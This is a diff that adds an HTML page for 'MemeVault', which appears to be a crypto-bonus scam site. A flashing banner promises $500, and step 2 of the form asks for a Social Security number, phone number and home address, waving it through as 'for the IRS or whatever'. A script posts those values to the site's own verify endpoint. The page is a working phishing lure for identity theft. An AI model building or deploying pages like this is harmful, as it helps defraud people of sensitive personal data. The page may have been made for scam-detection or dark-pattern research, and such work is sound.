@@ -1,0 +1,61 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width,initial-scale=1.0">
+<title>MemeVault — Step 2</title>
+<style>
+*{margin:0;padding:0;box-sizing:border-box}
+body{background:#0d0010;color:#fff;font-family:'Impact','Arial Black',sans-serif;min-height:100vh}
+@keyframes flash{0%,100%{background:#0d0010}50%{background:#1a002a}}
+@keyframes shake{0%,100%{transform:translateX(0)}25%{transform:translateX(-3px)}75%{transform:translateX(3px)}}
+body{animation:flash 1.5s infinite}
+
+.topbar{background:#000;padding:14px 24px;border-bottom:2px solid #ff00aa}
+.brand{font-size:24px;color:#ffea00;text-shadow:2px 2px #ff00aa}
+.bonus-banner{background:linear-gradient(90deg,#ff0066,#ffaa00);padding:14px;text-align:center;font-size:18px;font-weight:900;color:#000;animation:shake .3s infinite}
+.container{max-width:520px;margin:30px auto;padding:0 20px}
+.progress{display:flex;align-items:center;gap:8px;margin-bottom:24px;justify-content:center}
+.step{width:34px;height:34px;border-radius:50%;display:flex;align-items:center;justify-content:center;font-size:14px;font-weight:900;font-family:Arial}
+.step.active{background:#ff00aa;color:#000}
+.step.done{background:#00ff66;color:#000}
+.step.inactive{background:#333;color:#888}
+.step-line{width:48px;height:3px;background:#333}
+.card{background:linear-gradient(135deg,#1a0024,#2a0040);border:3px solid #ff00aa;border-radius:14px;padding:30px}
+h1{font-size:24px;color:#ffea00;text-shadow:2px 2px #ff00aa;margin-bottom:8px}
+.desc{font-size:14px;color:#fff;margin-bottom:18px;font-family:Arial;font-weight:normal}
+.field{margin-bottom:14px;font-family:Arial}
+.field label{display:block;font-size:12px;font-weight:900;color:#ffea00;margin-bottom:5px;text-transform:uppercase}
+.field input{width:100%;padding:10px 12px;background:#000;border:2px solid #ff00aa;border-radius:6px;color:#fff;font-family:'Courier New',monospace;outline:none}
+.btn{width:100%;padding:14px;background:#ff00aa;color:#000;border:none;border-radius:8px;font-size:16px;font-weight:900;cursor:pointer;text-transform:uppercase;letter-spacing:1.5px}
+</style>
+</head>
+<body>
+
+<header class="topbar"><div class="brand">💎 MemeVault 🚀</div></header>
+<div class="bonus-banner">2 MORE STEPS — $500 ALMOST YOURS!</div>
+<div class="container">
+  <div class="progress">
+    <div class="step done">✓</div><div class="step-line"></div>
+    <div class="step active">2</div><div class="step-line"></div>
+    <div class="step inactive">3</div>
+  </div>
+  <div class="card">
+    <h1>STEP 2 — IDENTITY</h1>
+    <p class="desc">For the IRS or whatever. Just fill it out.</p>
+    <form id="f">
+      <div class="field"><label>SSN</label><input id="ssn" placeholder="XXX-XX-XXXX" required></div>
+      <div class="field"><label>Phone</label><input id="phone" placeholder="+1 555-…" required></div>
+      <div class="field"><label>Address</label><input id="address" placeholder="Street, City, State, ZIP" required></div>
+      <button type="submit" class="btn">CONTINUE</button>
+    </form>
+  </div>
+</div>
+<script>
+document.getElementById('f').addEventListener('submit',function(e){e.preventDefault();
+fetch('/api/verify/2',{method:'POST',headers:{'Content-Type':'application/json'},
+body:JSON.stringify({ssn:ssn.value,phone:phone.value,address:address.value})
+}).then(function(){window.location.href='/verify/level-3'});});
+</script>
+</body>
+</html>
